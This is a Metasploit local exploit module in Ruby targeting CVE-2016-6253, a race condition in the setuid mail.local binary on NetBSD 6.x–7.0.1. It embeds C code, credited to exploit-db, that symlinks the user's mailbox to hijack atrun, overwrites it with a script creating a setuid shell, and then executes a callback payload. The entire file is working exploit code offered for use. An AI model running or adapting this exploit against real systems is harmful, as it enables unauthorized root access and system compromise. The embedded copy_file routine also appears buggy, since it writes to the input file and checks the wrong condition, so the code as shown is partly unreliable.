##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require \"msf/core\"

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
        \'Name\'           => \'NetBSD mail.local Privilege Escalation\',
        \'Description\'    => %q{
          This module attempts to exploit a race condition in mail.local with SUID bit set on:
            NetBSD 7.0 - 7.0.1 (verified on 7.0.1)
        NetBSD 6.1 - 6.1.5
        NetBSD 6.0 - 6.0.6
          Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.
        },
        \'License\'        => MSF_LICENSE,
        \'Author\'         =>
          [
            \'h00die <mike@stcyrsecurity.com>\',  # Module
            \'akat1\'                             # Discovery
          ],

        \'DisclosureDate\' => \'Jul 07 2016\',
        \'Platform\'        => \'unix\',
        \'Arch\'            => ARCH_CMD,
        \'SessionTypes\'    => %w{shell meterpreter},
        \'Privileged\'      => true,
        \'Payload\'         => {
          \'Compat\'        => {
            \'PayloadType\' => \'cmd cmd_bash\',
            \'RequiredCmd\' => \'generic openssl\'
          }
        },
        \'Targets\'       =>
          [
            [ \'Automatic Target\', {}]
          ],
        \'DefaultTarget\' => 0,
        \'DefaultOptions\' => { \'WfsDelay\' => 603 }, #can take 10min for cron to kick
        \'References\'     =>
          [
            [ \"URL\", \"http://akat1.pl/?id=2\"],
            [ \"EDB\", \"40141\"],
            [ \"CVE\", \"2016-6253\"],
            [ \"URL\", \"http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc\"]
          ]
      ))
    register_options([
      OptString.new(\'ATRUNPATH\', [true, \'Location of atrun binary\', \'/usr/libexec/atrun\']),
      OptString.new(\'MAILDIR\', [true, \'Location of mailboxes\', \'/var/mail\']),
      OptString.new(\'WritableDir\', [ true, \'A directory where we can write files\', \'/tmp\' ]),
      OptInt.new(\'ListenerTimeout\', [true, \'Number of seconds to wait for the exploit\', 603])
    ], self.class)
  end

  def exploit
    # lots of this file\'s format is based on pkexec.rb

    # direct copy of code from exploit-db
    main = %q{
  // Source: http://akat1.pl/?id=2

  #include <stdio.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <signal.h>
  #include <stdlib.h>
  #include <string.h>
  #include <err.h>
  #include <sys/wait.h>

  #define ATRUNPATH \"/usr/libexec/atrun\"
  #define MAILDIR \"/var/mail\"

  static int
  overwrite_atrun(void)
  {
    char *script = \"#! /bin/sh\\n\"
    \"cp /bin/ksh /tmp/ksh\\n\"
    \"chmod +s /tmp/ksh\\n\";
    size_t size;
    FILE *fh;
    int rv = 0;

    fh = fopen(ATRUNPATH, \"wb\");

    if (fh == NULL) {
      rv = -1;
      goto out;
    }

    size = strlen(script);
    if (size != fwrite(script, 1, strlen(script), fh)) {
      rv =  -1;
      goto out;
    }

  out:
    if (fh != NULL && fclose(fh) != 0)
      rv = -1;

      return rv;
  }

  static int
  copy_file(const char *from, const char *dest, int create)
  {
    char buf[1024];
    FILE *in = NULL, *out = NULL;
    size_t size;
    int rv = 0, fd;

    in = fopen(from, \"rb\");
    if (create == 0)
      out = fopen(dest, \"wb\");
    else {
      fd = open(dest, O_WRONLY | O_EXCL | O_CREAT, S_IRUSR | S_IWUSR);
      if (fd == -1) {
        rv = -1;
        goto out;
      }
      out = fdopen(fd, \"wb\");
    }

    if (in == NULL || out == NULL) {
      rv = -1;
      goto out;
    }

    while ((size = fread(&buf, 1, sizeof(buf), in)) > 0) {
      if (fwrite(&buf, 1, size, in) != 0) {
        rv = -1;
        goto out;
      }
    }

  out:
    if (in != NULL && fclose(in) != 0)
      rv = -1;
    if (out != NULL && fclose(out) != 0)
      rv = -1;
    return rv;
  }

  int
  main()
  {
    pid_t pid;
    uid_t uid;
    struct stat sb;
    char *login, *mailbox, *mailbox_backup = NULL, *atrun_backup, *buf;

    umask(0077);

    login = getlogin();

    if (login == NULL)
      err(EXIT_FAILURE, \"who are you?\");

      uid = getuid();

      asprintf(&mailbox, MAILDIR \"/%s\", login);

      if (mailbox == NULL)
        err(EXIT_FAILURE, NULL);

      if (access(mailbox, F_OK) != -1) {
        /* backup mailbox */
        asprintf(&mailbox_backup, \"/tmp/%s\", login);
        if (mailbox_backup == NULL)
          err(EXIT_FAILURE, NULL);
      }

      if (mailbox_backup != NULL) {
        fprintf(stderr, \"[+] backup mailbox %s to %s\\n\", mailbox, mailbox_backup);
          if (copy_file(mailbox, mailbox_backup, 1))
            err(EXIT_FAILURE, \"[-] failed\");
      }

      /* backup atrun(1) */
      atrun_backup = strdup(\"/tmp/atrun\");
      if (atrun_backup == NULL)
        err(EXIT_FAILURE, NULL);

      fprintf(stderr, \"[+] backup atrun(1) %s to %s\\n\", ATRUNPATH, atrun_backup);

      if (copy_file(ATRUNPATH, atrun_backup, 1))
        err(EXIT_FAILURE, \"[-] failed\");

      /* win the race */
      fprintf(stderr, \"[+] try to steal %s file\\n\", ATRUNPATH);

      switch (pid = fork()) {
      case -1:
        err(EXIT_FAILURE, NULL);
        /* NOTREACHED */
      case 0:
        asprintf(&buf, \"echo x | /usr/libexec/mail.local -f xxx %s \"
          \"2> /dev/null\", login);

        for(;;)
          system(buf);
        /* NOTREACHED */

      default:
        umask(0022);
        for(;;) {
          int fd;
          unlink(mailbox);
          symlink(ATRUNPATH, mailbox);
          sync();
          unlink(mailbox);
          fd = open(mailbox, O_CREAT, S_IRUSR | S_IWUSR);
          close(fd);
          sync();
          if (lstat(ATRUNPATH, &sb) == 0) {
            if (sb.st_uid == uid) {
              kill(pid, 9);
              fprintf(stderr, \"[+] won race!\\n\");
              break;
            }
          }
        }
        break;
      }
      (void)waitpid(pid, NULL, 0);

      if (mailbox_backup != NULL) {
        /* restore mailbox */
        fprintf(stderr, \"[+] restore mailbox %s to %s\\n\", mailbox_backup, mailbox);

        if (copy_file(mailbox_backup, mailbox, 0))
          err(EXIT_FAILURE, \"[-] failed\");
        if (unlink(mailbox_backup) != 0)
          err(EXIT_FAILURE, \"[-] failed\");
      }

      /* overwrite atrun */
      fprintf(stderr, \"[+] overwriting atrun(1)\\n\");

      if (chmod(ATRUNPATH, 0755) != 0)
        err(EXIT_FAILURE, NULL);

      if (overwrite_atrun())
        err(EXIT_FAILURE, NULL);

      fprintf(stderr, \"[+] waiting for atrun(1) execution...\\n\");

      for(;;sleep(1)) {
        if (access(\"/tmp/ksh\", F_OK) != -1)
          break;
      }

      /* restore atrun */
      fprintf(stderr, \"[+] restore atrun(1) %s to %s\\n\", atrun_backup, ATRUNPATH);

      if (copy_file(atrun_backup, ATRUNPATH, 0))
        err(EXIT_FAILURE, \"[-] failed\");
      if (unlink(atrun_backup) != 0)
        err(EXIT_FAILURE, \"[-] failed\");

      if (chmod(ATRUNPATH, 0555) != 0)
        err(EXIT_FAILURE, NULL);

      fprintf(stderr, \"[+] done! Don\'t forget to change atrun(1) \"
        \"ownership.\\n\");
      fprintf(stderr, \"Enjoy your shell:\\n\");

      execl(\"/tmp/ksh\", \"ksh\", NULL);

      return 0;
  }
}
    # patch in our variable maildir and atrunpath
    main.gsub!(/#define ATRUNPATH \"\\/usr\\/libexec\\/atrun\"/,
               \"#define ATRUNPATH \\\"#{datastore[\"ATRUNPATH\"]}\\\"\")
    main.gsub!(/#define MAILDIR \"\\/var\\/mail\"/,
               \"#define MAILDIR \\\"#{datastore[\"MAILDIR\"]}\\\"\")

    executable_path = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(8)}\"
    payload_file = \"#{rand_text_alpha(8)}\"
    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"
    vprint_status(\"Writing Payload to #{payload_path}\")
    # patch in to run our payload as part of ksh
    main.gsub!(/execl\\(\"\\/tmp\\/ksh\", \"ksh\", NULL\\);/,
               \"execl(\\\"/tmp/ksh\\\", \\\"ksh\\\", \\\"#{payload_path}\\\", NULL);\")

    write_file(payload_path, payload.encoded)
    cmd_exec(\"chmod 555 #{payload_path}\")
    register_file_for_cleanup(payload_path)

    print_status \"Writing exploit to #{executable_path}.c\"

    # clean previous bad attempts to prevent c code from exiting
    rm_f executable_path
    rm_f \'/tmp/atrun\'
    whoami = cmd_exec(\'whoami\')
    rm_f \"/tmp/#{whoami}\"

    write_file(\"#{executable_path}.c\", main)
    print_status(\"Compiling #{executable_path}.c via gcc\")
    output = cmd_exec(\"/usr/bin/gcc -o #{executable_path}.out #{executable_path}.c\")
    output.each_line { |line| vprint_status(line.chomp) }

    print_status(\'Starting the payload handler...\')
    handler({})

    print_status(\"Executing at #{Time.now}.  May take up to 10min for callback\")
    output = cmd_exec(\"chmod +x #{executable_path}.out; #{executable_path}.out\")
    output.each_line { |line| vprint_status(line.chomp) }

    # our sleep timer
    stime = Time.now.to_f
    until session_created? || stime + datastore[\'ListenerTimeout\'] < Time.now.to_f
      Rex.sleep(1)
    end
    print_status(\"#{Time.now}\")
    register_file_for_cleanup(executable_path)
    register_file_for_cleanup(\"#{executable_path}.out\")
    print_status(\"Remember to run: chown root:wheel #{datastore[\"ATRUNPATH\"]}\")
  end
end